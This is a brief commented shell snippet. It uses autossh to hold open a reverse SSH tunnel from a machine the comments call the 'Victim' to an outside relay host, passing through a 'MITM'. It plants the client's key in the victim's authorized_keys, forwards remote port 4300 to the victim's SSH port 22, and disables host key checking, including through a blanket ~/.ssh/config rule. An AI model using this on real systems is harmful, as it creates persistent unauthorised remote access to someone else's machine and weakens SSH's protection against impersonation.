# -M Monitor Port 2222 on remote server
# -N No Remote Shell
# -i Identity File to use
# -R remote port forward; ie. Tunnel using remote port 4300 which is connected to local port 22
# -o ssh option to disable host key checking
# Add following to ~/.ssh/config
#Host *
#    StrictHostKeyChecking no

# Client -> MITM -> Victim
#Ensure that the SSH keys used by CLIENT is in VICTIMs ~/authorized_keys

/usr/bin/autossh -M 2222 -N -i PATH_TO_IDENTITYFILE -R 4300:localhost:22 USER@IP -o "StrictHostKeyChecking=no" -o "ServerAliveInterval 30"

